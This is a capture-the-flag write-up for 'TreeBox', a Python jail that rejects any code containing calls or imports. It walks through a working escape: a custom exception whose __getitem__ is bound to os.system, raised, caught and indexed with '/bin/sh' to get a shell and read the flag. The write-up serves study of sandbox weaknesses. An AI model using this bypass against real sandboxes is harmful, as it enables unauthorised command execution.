# TreeBox

## Challenge Description
**Category**: Sandbox

**Description**: I think I finally got Python sandboxing right.

![treeBoxImg](https://user-images.githubusercontent.com/80763028/178986252-7533e86c-db02-47ca-b146-ad5584c6a692.jpg)

The challenge was a pyjail-style sandbox, that needed to "escaped" from - regain the ability to execute arbitrary code (and read the flag file) given a VERY restrictive environment. As usual with pyjails, the source code was provided:

```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```

## Code Evaluation
Looking at the source code, the program checks the input code before executing it - only if the code is labeled 'safe' by ```verify_secure```,
that uses the ```ast``` library (**A**bstract **S**yntax **T**rees) to parse the input.

Essentially, both functions calls and import statements are banned, because they match either of ```ast.Call, ast.Import, ast.ImportFrom```

Note: The program uses structured pattern matching, so we know that it is running on Python 3.10+

## Thought Process

While imports can be avoided, function calls are a fundemental part of any programming language.
At first glance, the objective of reading the flag without calling any function seems impossible.

This means that the challenge must be solved by:
1. Somehow managing to read the flag file without using calls or import statements (unlikely)
2. Figuring out a way to fool ```ast``` by calling functions indirectly, so it won't notice the function calls made by the program

As far as we know, it's impossible to access the file system or the shell without invoking any functions, so we tried to change the angle of thinking about this challenge to the second way.

We needed to find the 'trickable' part of the program, as a chain is only as strong as its weakest link.
A few options come to mind:
1. Python's match-case
2. ast parser

We didn't believe Python's match-case to be the weak part, as that would be a fatal flaw in Python itself, and probably not the intention of the challenge authors anyway (even though it is *possible*, see Python2's ```input()``` RCE vulnerability).

That leaves tricking the ast parser by calling functions indirectly (without invoking them using parentheses).

## Dunder Methods To the Rescue!

One way to achieve indirect function calls, is dunder (double underscore) methods. These are functions that help creating classes in Python, and are normally used in order to make contructors, overload operators change the behavior of Python built-in functions on the classe's objects, and more.

## Constructing a Solution Payload
At first, this doesn't seem to be of much help - to create an object (and invoke ```__init__``` or another dunder method).
After putting some thought into it, we came to realize that exceptions are classes too! A quick check reveals that it is possible to raise exceptions without any arguments.
Meaning:

```raise Exception``` is allowed, but ```raise Exception("Can I pass an argument?")``` would match to ```ast.Call```.

Knowing all of this, we can create (and raise) a custom exception (a class that inherits from ```Exception```), catch the exception
and get access to the exception object, already equipped with the dunder method we created.

So our theoretical payload would look something like this:
```python
class CustomException(Exception):
  pass # TODO: add a dunder method to use when handling the exception
  
 try:
   raise CustomException
 except CustomException as e:
   pass # TODO: use the exception object (e)
```

At this point, there are several approaches to what dunder method to use to inderectly call a function. One of the most common ones is to overload one of the operators, for example, the plus operator (+) using the ```__add__``` method.

We chose to use ```__getitem__```.
```__getitem__``` is the function that is being called when looking for a value that matches a key in a dictionary.

For instance, in the following code snippet, ```__getitem__``` is called to retrieve the value matching the key 'a':
```python
d = {'a': 1, 'b': 2}
d['a']
```
By overriding ```__getitem__``` in our custom exception with another function, we can get ANY function to execute with one argument - whatever we put in the square brackets as a 'key'.

Since the ```os``` module is loaded into the running namespace, we can override ```__getitem__``` with os.system and thus execute any shell command.

This brings us to the final attack payload:
```python
class CustomException(Exception):
	__getitem__ = os.system

try:
	raise CustomException
except CustomException as e:
	e["/bin/sh"]
--END
```
Which will end up executing: ```os.system("/bin/sh")```, providing us an unlimited shell.
```bash
$ cat flag
CTF{CzeresniaTopolaForsycja}
```

**P.S.** This challenge is probably the only time we were *delighted* to see an exception, instead of being frustrated :)

*Writeup by C0d3 Bre4k3rs: 5h4d0w, N04M1st3r*
